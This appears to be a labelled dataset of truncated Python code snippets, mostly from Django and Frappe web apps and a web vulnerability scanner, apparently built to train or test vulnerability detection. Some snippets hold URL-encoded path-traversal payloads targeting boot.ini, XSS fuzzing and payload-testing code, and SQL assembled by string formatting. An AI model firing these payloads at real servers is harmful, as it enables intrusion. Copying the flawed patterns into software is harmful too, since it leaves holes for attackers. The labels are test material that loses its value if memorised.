fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) ", "label": 0}, {"snippet_id": 5493, "code": "'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> '''", "label": 0}, {"snippet_id": 31532, "code": " serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_waf_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[2]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['conn']=str(i[1", "label": 0}, {"snippet_id": 12317, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 50964, "code": " import_export import resources from import_export.admin import ImportExportModelAdmin from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList class MyPeriodicTaskForm", "label": 0}, {"snippet_id": 39758, "code": "(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and", "label": 0}, {"snippet_id": 45872, "code": " deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except", "label": 0}, {"snippet_id": 38346, "code": "\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\"", "label": 0}, {"snippet_id": 2786, "code": " is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid", "label": 0}, {"snippet_id": 26704, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',", "label": 0}, {"snippet_id": 31620, "code": "\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover", "label": 0}, {"snippet_id": 38454, "code": " \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe", "label": 0}, {"snippet_id": 6639, "code": " return bool(int(res)) @property def status_test_usernames(self): \"\"\" Get list of usernames valid for use with the /status URL. If this list is['*'], all usernames are allowed for /status. :return: list of", "label": 0}, {"snippet_id": 35786, "code": ": \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length", "label": 0}, {"snippet_id": 27488, "code": " add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url(dest_url): \"\"\"Make the", "label": 0}, {"snippet_id": 12311, "code": "<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>", "label": 0}, {"snippet_id": 42740, "code": ".get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable", "label": 0}, {"snippet_id": 19095, "code": " \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite,", "label": 0}, {"snippet_id": 21031, "code": ", name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify", "label": 0}, {"snippet_id": 12742, "code": ".views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url", "label": 0}, {"snippet_id": 41257, "code": ".format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name", "label": 1}, {"snippet_id": 8942, "code": "?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 37818, "code": " __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import", "label": 1}, {"snippet_id": 22165, "code": " url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r", "label": 0}, {"snippet_id": 44345, "code": "'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc", "label": 1}, {"snippet_id": 30353, "code": ") \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh) \texcept requests.exceptions.ConnectionError as errc: \t\tprint('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc", "label": 0}, {"snippet_id": 2573, "code": "(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":", "label": 0}, {"snippet_id": 21960, "code": "'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login", "label": 0}, {"snippet_id": 38019, "code": "('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category", "label": 0}, {"snippet_id": 7077, "code": "'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset'", "label": 0}, {"snippet_id": 38163, "code": "\t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children()", "label": 0}, {"snippet_id": 1353, "code": "={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'],", "label": 0}, {"snippet_id": 42430, "code": ".get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join", "label": 0}, {"snippet_id": 33267, "code": " task_id): swarming.cancel_task(host, task_id) class UnregisterBuilders(webapp2.RequestHandler): \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\" @decorators.require_cronjob def get(self", "label": 0}, {"snippet_id": 41081, "code": ".blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context", "label": 0}, {"snippet_id": 12166, "code": ", 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(", "label": 1}, {"snippet_id": 38533, "code": ".db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype", "label": 0}, {"snippet_id": 20734, "code": ", 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views", "label": 0}, {"snippet_id": 20389, "code": "*kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses", "label": 0}, {"snippet_id": 30951, "code": ",extensions=['jinja2.ext.loopcontrols']) \ttemplate=env.get_template('config_show.html') \t \ttemplate=template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'", "label": 1}, {"snippet_id": 18227, "code": "\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/", "label": 1}, {"snippet_id": 1578, "code": ": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast", "label": 0}, {"snippet_id": 845, "code": " api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line:", "label": 0}, {"snippet_id": 516, "code": " urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[]", "label": 0}, {"snippet_id": 21167, "code": ".calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 18951, "code": "'ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate", "label": 0}, {"snippet_id": 51498, "code": "'django_uwsgi',] except ImportError: pass MIDDLEWARE=[ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.locale.LocaleMiddleware", "label": 0}, {"snippet_id": 47951, "code": ") user.displayName=displayname user.authuser=auth_user user.dect=dect user.notes=notes user.active=True user.save() pass pass except Exception as e: return HttpResponseBadRequest(str(e)) return redirect", "label": 0}, {"snippet_id": 34521, "code": "\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value):", "label": 0}, {"snippet_id": 34121, "code": " set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map", "label": 0}, {"snippet_id": 43082, "code": "\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self", "label": 0}, {"snippet_id": 16424, "code": ", (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP", "label": 0}, {"snippet_id": 43978, "code": " \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t", "label": 0}, {"snippet_id": 11189, "code": " If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[", "label": 0}, {"snippet_id": 34498, "code": "\t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field", "label": 0}, {"snippet_id": 26369, "code": " via the VAT reimbursement process.')) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if", "label": 0}, {"snippet_id": 39145, "code": ".__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField", "label": 0}, {"snippet_id": 43677, "code": "(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\",", "label": 0}, {"snippet_id": 50056, "code": "): \"\"\" An ajax/comet long-polling transport \"\"\" isLeaf=True allowedMethods=('POST',) def __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self", "label": 0}, {"snippet_id": 323, "code": "\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in", "label": 0}, {"snippet_id": 38879, "code": ", \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self", "label": 0}, {"snippet_id": 53761, "code": "=str, required=True, help='The name of the application') parser.add_argument('--region', type=str, required=True, help='The default application region') args=parser.parse_args() write_eb_config(args.dest", "label": 0}, {"snippet_id": 23824, "code": "(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual", "label": 0}, {"snippet_id": 748, "code": " xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url", "label": 1}, {"snippet_id": 12871, "code": ", 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^", "label": 0}, {"snippet_id": 29187, "code": "=ssh_command(serv, commands, print_out=\"1\") \tif stderr is None: \t\tsql.insert_waf_metrics_enable(serv, \"0\") def check_haproxy_version(serv): \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port", "label": 0}, {"snippet_id": 39474, "code": "\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label", "label": 0}, {"snippet_id": 48601, "code": ".primary_reservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) sr.save() print(request.POST) print(sr.notes) return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"", "label": 0}, {"snippet_id": 41472, "code": "\"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image", "label": 0}, {"snippet_id": 55094, "code": ".values_list('resource__project__pk', flat=True) projects=Project.objects.filter(pk__in=projects_pk.distinct()) for project in projects: if( not request.user.can_translate(project=project, locale=locale) or", "label": 0}, {"snippet_id": 43200, "code": ".fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length", "label": 0}, {"snippet_id": 11560, "code": "'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r", "label": 0}, {"snippet_id": 15592, "code": "() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir.", "label": 0}, {"snippet_id": 30178, "code": ": \t\tprint(\"Bad config, check please\") \t if form.getvalue('action_waf') is not None and serv is not None: \tserv=form.getvalue('serv') \taction=form.getvalue('action_waf') \tcommands=[ \"sudo systemctl %s waf", "label": 0}, {"snippet_id": 12699, "code": "'submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +", "label": 0}, {"snippet_id": 17318, "code": "(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 51063, "code": "', 'queue', 'task', 'args', 'last_run', 'runs') list_filter=('enabled', 'queue', 'crontab') search_fields=('name', 'queue', 'args') form=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj)", "label": 0}, {"snippet_id": 36143, "code": " self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield", "label": 0}, {"snippet_id": 46083, "code": " request.method=='GET': if 'q' in request.GET: query['qs'][0]['q']=request.GET.get('q') if 'qd' in request.GET: query['qd']=request.GET.get('qd') template='search.mako' if is_mobile: template='search_m", "label": 1}, {"snippet_id": 16286, "code": ", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 41380, "code": ") \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format", "label": 0}, {"snippet_id": 15468, "code": ".__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\")", "label": 0}, {"snippet_id": 23377, "code": "-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 36028, "code": ".fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype", "label": 0}, {"snippet_id": 2742, "code": " ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26'", "label": 0}, {"snippet_id": 17491, "code": " +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=", "label": 0}, {"snippet_id": 47858, "code": "\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active=magic.parse_bool(request.POST[\"active\"]) au: User=user.authuser if check_password_conformity(pw1, pw2): logging.log(logging.INFO, \"Set password for user:", "label": 0}, {"snippet_id": 3972, "code": "{ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body", "label": 0}, {"snippet_id": 8442, "code": " django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib", "label": 0}, {"snippet_id": 48629, "code": ".get(id=int(request.GET[\"rid\"])) elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count(): r=GroupReservation() r.createdByUser=u r.ready=False r.open=True", "label": 0}, {"snippet_id": 28677, "code": " content=\"0; url=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies \tcookie=http", "label": 0}, {"snippet_id": 48156, "code": " it. The resulting PK is \" +str(m.pk)) def action_add_single_media(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text\"] file=request", "label": 0}, {"snippet_id": 29845, "code": " ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect') is not None and serv is not None: \ttry: \t\tfunct.ssh_command", "label": 0}, {"snippet_id": 46577, "code": " searcher=DashboardController(request.user) response={ 'result': searcher.delete_collections([collection['id'] for collection in collections]) } return JsonResponse(response) def admin_collection_copy(request", "label": 0}, {"snippet_id": 18801, "code": "+=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url", "label": 0}, {"snippet_id": 38347, "code": " Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start", "label": 0}, {"snippet_id": 38072, "code": " get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog'", "label": 0}, {"snippet_id": 7979, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P", "label": 0}, {"snippet_id": 21591, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url", "label": 0}, {"snippet_id": 7524, "code": "<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course", "label": 0}, {"snippet_id": 7087, "code": "), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done", "label": 0}, {"snippet_id": 42433, "code": " \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t", "label": 0}, {"snippet_id": 50914, "code": " from cryptography.fernet import Fernet from django.conf import settings from django.contrib import admin from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin from django.contrib.auth.admin", "label": 0}, {"snippet_id": 27285, "code": " print \"[+] Host acquired \" +host print \"[+] Retrieve page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url", "label": 1}, {"snippet_id": 27307, "code": " object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os import re import sys import traceback import", "label": 0}, {"snippet_id": 7944, "code": "+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 31441, "code": "[serv].title.text_font_size=\"20px\"\t\t\t\t\t\t \t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color=' \t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date", "label": 0}, {"snippet_id": 27135, "code": ", rtype, params, hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name", "label": 1}, {"snippet_id": 24917, "code": ") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__", "label": 0}, {"snippet_id": 48319, "code": " current_reservation.submitted==True: return HttpResponseRedirect(\"/admin?error=Already%20submitted\") if \"article_id\" in request.POST: aid: int=int(request.GET.get(\"article_id\")) quantity: int=int(request.POST[", "label": 0}, {"snippet_id": 42063, "code": " \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1", "label": 0}, {"snippet_id": 42752, "code": " strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t", "label": 0}, {"snippet_id": 14969, "code": " and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 26409, "code": " ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) for f in", "label": 0}, {"snippet_id": 35599, "code": " cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta", "label": 0}, {"snippet_id": 8033, "code": "'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes", "label": 0}, {"snippet_id": 47425, "code": "/>')) else: f.add_content(PlainText('<h3>Add new user</h3>')) if not profile: f.add_content(PlainText(\"username(can't be edited later on): \")) f.add_content(TextField(name='username')) if http_request.GET", "label": 0}, {"snippet_id": 20730, "code": " url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 12335, "code": ".index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), 